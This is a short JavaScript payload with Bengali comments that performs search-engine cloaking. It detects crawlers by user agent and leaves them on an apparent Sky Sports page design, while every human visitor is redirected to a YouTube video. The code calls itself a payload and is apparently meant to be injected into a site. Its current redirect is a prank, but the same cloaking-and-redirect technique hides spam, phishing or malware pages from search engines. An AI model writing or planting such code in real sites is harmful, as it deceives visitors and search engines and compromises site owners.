(function() {
    console.log(" [PAYLOAD EXECUTED] ");

    const isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);

    if (isBot) {
        // ==========================================
        // [BOT PATH] 
        // গুগলবট এলে আমরা কিছুই করব না। 
        // index.html এর নিজস্ব স্কাই স্পোর্টস ডিজাইনটাই থাকবে।
        // ==========================================
        console.log("🤖 [BOT DETECTED] Letting Googlebot see the original Skysports design.");
    } else {
        // ==========================================
        //  [HUMAN PATH] 
        // মানুষ এলে YouTube-এ রিডাইরেক্ট করব।
        // ==========================================
        console.log(" [HUMAN DETECTED] Redirecting to YouTube...");
        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
    }
})();
